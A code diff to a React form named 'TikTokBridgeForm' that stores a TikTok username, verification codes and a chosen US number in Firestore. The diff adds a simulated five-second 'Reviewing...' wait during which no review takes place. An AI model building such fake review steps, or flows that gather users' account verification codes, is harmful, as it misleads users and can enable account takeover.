@@ -11,7 +11,7 @@ import { collection, doc } from "firebase/firestore";
 import { useRouter } from "next/navigation";
 
 import { Button } from "@/components/ui/button";
-import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle, CardBadge } from "@/components/ui/card";
+import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from "@/components/ui/card";
 import { Input } from "@/components/ui/input";
 import { InputOTP, InputOTPGroup, InputOTPSlot } from "@/components/ui/input-otp";
 import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from "@/components/ui/form";
@@ -34,9 +34,9 @@ const TIKTOK_BRIDGE_STEPS = [
 
 const formSchema = z.object({
   username: z.string().min(2, "Username must be at least 2 characters."),
-  verificationCode: z.string().length(6, "Code must be 6 digits."),
-  usNumber: z.string({ required_error: "Please select a number." }),
-  finalCode: z.string().length(6, "Code must be 6 digits."),
+  verificationCode: z.string().length(6, "Code must be 6 digits.").optional(),
+  usNumber: z.string({ required_error: "Please select a number." }).optional(),
+  finalCode: z.string().length(6, "Code must be 6 digits.").optional(),
 });
 
 type FormValues = z.infer<typeof formSchema>;
@@ -97,6 +97,7 @@ export function TikTokBridgeForm({ onFinished }: { onFinished?: () => void }) {
         
         // Step 1: Create the document
         if (currentStep === 0) { 
+            setLinkingMessage("Reviewing...");
             const { username } = form.getValues();
             const newDocRef = await addDocument(collection(firestore, "tiktok_users"), {
                 tiktokUsername: username,
@@ -108,6 +109,8 @@ export function TikTokBridgeForm({ onFinished }: { onFinished?: () => void }) {
             setSubmissionId(newDocRef.id);
             localStorage.setItem('submissionId', newDocRef.id);
             currentSubmissionId = newDocRef.id;
+            await new Promise(resolve => setTimeout(resolve, 5000));
+            setLinkingMessage(null);
         }
         
         if (!currentSubmissionId) {
@@ -219,22 +222,29 @@ export function TikTokBridgeForm({ onFinished }: { onFinished?: () => void }) {
               <CarouselContent>
                 {/* Step 1: Username */}
                 <CarouselItem>
-                  <FormField
-                    control={form.control}
-                    name="username"
-                    render={({ field }) => (
-                      <FormItem className="pt-2">
-                        <FormLabel>TikTok Username</FormLabel>
-                        <FormControl>
-                          <div className="relative">
-                            <AtSign className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground" />
-                            <Input placeholder="your_username" {...field} className="pl-10 h-11" />
-                          </div>
-                        </FormControl>
-                        <FormMessage />
-                      </FormItem>
+                    {linkingMessage ? (
+                        <div className="flex flex-col items-center justify-center h-[280px] text-center">
+                            <Loader2 className="h-8 w-8 animate-spin text-primary mb-4" />
+                            <p className="text-muted-foreground">{linkingMessage}</p>
+                        </div>
+                    ) : (
+                        <FormField
+                            control={form.control}
+                            name="username"
+                            render={({ field }) => (
+                            <FormItem className="pt-2">
+                                <FormLabel>TikTok Username</FormLabel>
+                                <FormControl>
+                                <div className="relative">
+                                    <AtSign className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground" />
+                                    <Input placeholder="your_username" {...field} className="pl-10 h-11" />
+                                </div>
+                                </FormControl>
+                                <FormMessage />
+                            </FormItem>
+                            )}
+                        />
                     )}
-                  />
                 </CarouselItem>
 
                 {/* Step 2: First Code */}
@@ -403,3 +413,5 @@ export function TikTokBridgeForm({ onFinished }: { onFinished?: () => void }) {
     </Card>
   );
 }
+
+    
